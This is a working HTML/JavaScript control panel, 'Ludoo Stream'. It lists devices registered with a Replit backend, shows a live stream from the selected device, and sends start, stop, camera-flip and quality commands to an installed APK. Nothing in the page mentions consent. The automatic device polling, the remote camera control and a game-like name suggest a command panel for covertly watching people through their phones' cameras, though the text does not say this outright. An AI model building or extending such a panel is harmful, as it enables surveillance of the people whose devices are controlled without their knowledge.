<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludoo Stream</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* ========== HEADER ========== */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 20px;
            background: rgba(0,0,0,0.9);
            border-bottom: 0.5px solid rgba(255,255,255,0.1);
            z-index: 10;
        }

        .back-btn {
            background: none;
            border: none;
            color: #00ff88;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .back-btn span {
            font-size: 14px;
            font-weight: 500;
        }

        .status-badge {
            background: rgba(0,255,136,0.2);
            padding: 6px 14px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff88;
            animation: pulse 1.5s infinite;
        }

        .status-text {
            color: #00ff88;
            font-size: 12px;
            font-weight: 500;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1); }
        }

        /* ========== IFRAME CONTAINER ========== */
        .iframe-container {
            flex: 1;
            position: relative;
            background: #000;
            min-height: 0;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            background: #000;
        }

        /* ========== DEVICE BAR ========== */
        .device-bar {
            padding: 12px 20px;
            background: #0a0a0a;
            border-top: 0.5px solid rgba(255,255,255,0.1);
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
            z-index: 10;
        }

        .device-label {
            color: #888;
            font-size: 12px;
            font-weight: 500;
        }

        .device-select {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 10px 16px;
            border-radius: 12px;
            color: white;
            font-size: 14px;
            cursor: pointer;
            outline: none;
        }

        .refresh-btn {
            background: #333;
            border: none;
            padding: 10px 20px;
            border-radius: 12px;
            color: white;
            cursor: pointer;
            font-size: 14px;
        }

        .refresh-btn:active {
            transform: scale(0.95);
        }

        /* ========== CONTROL BUTTONS ========== */
        .controls {
            padding: 12px 20px;
            background: #0a0a0a;
            border-top: 0.5px solid rgba(255,255,255,0.1);
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .ctrl-btn {
            background: #1a1a1a;
            border: none;
            padding: 10px 24px;
            border-radius: 40px;
            color: white;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .ctrl-btn:active {
            transform: scale(0.95);
        }

        .start-btn {
            background: #00ff88;
            color: #000;
        }

        .stop-btn {
            background: #ff4444;
            color: #fff;
        }

        .flip-btn {
            background: #ff8800;
            color: #000;
        }

        .quality-group {
            display: flex;
            gap: 8px;
            margin-left: auto;
        }

        .quality-btn {
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 12px;
            cursor: pointer;
            color: #ccc;
        }

        .quality-btn.active {
            background: #00ff88;
            color: #000;
            border-color: #00ff88;
        }

        @media (max-width: 600px) {
            .controls {
                flex-wrap: wrap;
            }
            .quality-group {
                margin-left: 0;
                width: 100%;
                justify-content: center;
            }
            .ctrl-btn {
                padding: 8px 18px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="header">
        <button class="back-btn" onclick="history.back()">
            ← <span>BACK</span>
        </button>
        <div class="status-badge">
            <div class="status-dot"></div>
            <span class="status-text" id="connectionStatus">READY</span>
        </div>
    </div>

    <!-- IFRAME - SMOOTH STREAM FROM BACKEND -->
    <div class="iframe-container">
        <iframe id="streamFrame" src=""></iframe>
    </div>

    <!-- DEVICE SELECTOR BAR -->
    <div class="device-bar">
        <span class="device-label">📱 DEVICE</span>
        <select id="deviceSelect" class="device-select" onchange="onDeviceChange()">
            <option value="">-- Select Device --</option>
        </select>
        <button class="refresh-btn" onclick="loadDevices()">⟳ REFRESH</button>
    </div>

    <!-- CONTROL BUTTONS -->
    <div class="controls">
        <button class="ctrl-btn start-btn" onclick="sendCommand('start')">▶ START</button>
        <button class="ctrl-btn stop-btn" onclick="sendCommand('stop')">⏹ STOP</button>
        <button class="ctrl-btn flip-btn" onclick="sendCommand('flip')">🔄 FLIP</button>
        <div class="quality-group">
            <button class="quality-btn" data-quality="140p" onclick="sendQuality('140p')">140p</button>
            <button class="quality-btn" data-quality="240p" onclick="sendQuality('240p')">240p</button>
            <button class="quality-btn active" data-quality="360p" onclick="sendQuality('360p')">360p</button>
        </div>
    </div>

    <script>
        // 🔴 YAHAN APKA NAYA BACKEND LINK 🔴
        const BACKEND_URL = "https://9b8560e5-5a97-41f0-a014-0067b4080063-00-2mw8e8pmpxhkb.pike.replit.dev";
        
        let currentDeviceId = null;
        let currentQuality = "360p";
        
        // ============================================
        // LOAD ALL CONNECTED DEVICES
        // ============================================
        async function loadDevices() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/devices`);
                const data = await response.json();
                const select = document.getElementById('deviceSelect');
                const oldValue = select.value;
                
                if (data.success && data.devices && data.devices.length > 0) {
                    let options = '<option value="">-- Select Device --</option>';
                    data.devices.forEach(device => {
                        options += `<option value="${device.device_id}">📱 ${device.device_name}</option>`;
                    });
                    select.innerHTML = options;
                    
                    if (oldValue && data.devices.find(d => d.device_id === oldValue)) {
                        select.value = oldValue;
                        if (oldValue === currentDeviceId) {
                            updateIframe();
                        }
                    }
                    
                    document.getElementById('connectionStatus').innerHTML = 'ONLINE';
                    document.getElementById('connectionStatus').style.color = '#00ff88';
                } else {
                    select.innerHTML = '<option value="">-- No Devices --</option>';
                    document.getElementById('connectionStatus').innerHTML = 'WAITING';
                    document.getElementById('connectionStatus').style.color = '#ffaa00';
                }
            } catch (e) {
                console.error('Load devices error:', e);
                document.getElementById('connectionStatus').innerHTML = 'OFFLINE';
                document.getElementById('connectionStatus').style.color = '#ff4444';
            }
        }
        
        // ============================================
        // DEVICE CHANGE - UPDATE IFRAME
        // ============================================
        function onDeviceChange() {
            const select = document.getElementById('deviceSelect');
            currentDeviceId = select.value;
            
            if (currentDeviceId) {
                updateIframe();
                document.getElementById('connectionStatus').innerHTML = 'STREAMING';
                document.getElementById('connectionStatus').style.color = '#00ff88';
            } else {
                document.getElementById('streamFrame').src = '';
                document.getElementById('connectionStatus').innerHTML = 'READY';
            }
        }
        
        // Update iframe with smooth stream
        function updateIframe() {
            if (currentDeviceId) {
                const frameUrl = `${BACKEND_URL}/live?device_id=${currentDeviceId}`;
                document.getElementById('streamFrame').src = frameUrl;
            }
        }
        
        // ============================================
        // SEND COMMAND TO APK
        // ============================================
        async function sendCommand(cmd) {
            if (!currentDeviceId) {
                alert('Please select a device first!');
                return;
            }
            
            try {
                const response = await fetch(`${BACKEND_URL}/api/command?cmd=${cmd}&device_id=${currentDeviceId}`);
                const result = await response.json();
                
                if (result.success) {
                    console.log(`✅ Command ${cmd} sent to ${currentDeviceId}`);
                    document.getElementById('connectionStatus').innerHTML = cmd.toUpperCase();
                    setTimeout(() => {
                        if (currentDeviceId) {
                            document.getElementById('connectionStatus').innerHTML = 'STREAMING';
                        }
                    }, 1000);
                } else {
                    console.error('Command failed:', result.error);
                    alert('Command failed: ' + (result.error || 'Unknown error'));
                }
            } catch (e) {
                console.error('Command error:', e);
                alert('Error sending command: ' + e.message);
            }
        }
        
        // ============================================
        // SEND QUALITY TO APK
        // ============================================
        async function sendQuality(quality) {
            if (!currentDeviceId) {
                alert('Please select a device first!');
                return;
            }
            
            currentQuality = quality;
            
            // Update active button style
            document.querySelectorAll('.quality-btn').forEach(btn => {
                if (btn.getAttribute('data-quality') === quality) {
                    btn.classList.add('active');
                } else {
                    btn.classList.remove('active');
                }
            });
            
            try {
                const response = await fetch(`${BACKEND_URL}/api/quality?quality=${quality}&device_id=${currentDeviceId}`);
                const result = await response.json();
                
                if (result.success) {
                    console.log(`✅ Quality ${quality} sent to ${currentDeviceId}`);
                }
            } catch (e) {
                console.error('Quality error:', e);
            }
        }
        
        // ============================================
        // AUTO REFRESH DEVICES EVERY 5 SECONDS
        // ============================================
        loadDevices();
        setInterval(loadDevices, 5000);
    </script>
</body>
</html>
